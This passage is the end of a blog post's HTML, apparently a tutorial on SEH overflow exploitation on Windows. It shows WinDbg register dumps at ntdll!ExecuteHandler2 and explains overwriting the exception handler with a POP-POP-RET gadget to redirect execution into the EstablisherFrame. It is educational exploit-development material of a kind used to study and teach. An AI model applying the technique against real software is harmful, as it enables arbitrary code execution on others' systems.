+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">6f</span>db73da edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">77316247</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">44</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316247</span> ff750c          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch]  ss:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">46</span>c<span style="color:#f92672">=</span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">44</span>
+</span></span></code></pre></div><p>Let&rsquo;s see the contents of ebp+0ch:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dds ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">46</span>c  <span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">44</span>
+</span></span></code></pre></div><p>We can see that the address of our <code>_EXCEPTION_REGISTRATION_RECORD</code> is there. The other parameters are also EBP offsets, but we are not interested.</p>
+<p>Once that we know that such address is the one we want to redirect the execution flow, we could overwrite the exception handler with the address of an instruction that returns into the <strong>EstablisherFrame</strong> address on the stack, so that our code is executed.
+The most common sequence of instructions used in SEH overflows to accomplish this task is <strong>“POP R32, POP R32, RET”,</strong> in which we POP the return address and the ExceptionRecord argument from the stack into two arbitrary registers (R32) and then execute a RET operation to return into the EstablisherFrame. This is because we pushed the last argument, before the &ldquo;call ecx&rdquo; instruction. The call instruction pushes in the stack the return address, so would have to pop the return address and the last argument to have the EstablisherFrame address in the top of the stack, so we can perform a <code>ret</code> to this address and redirect the flow.</p>
+</div>
+</article>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2025 &copy; made by jaco with love
+    </small></p>
+    <p><small>
+        Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
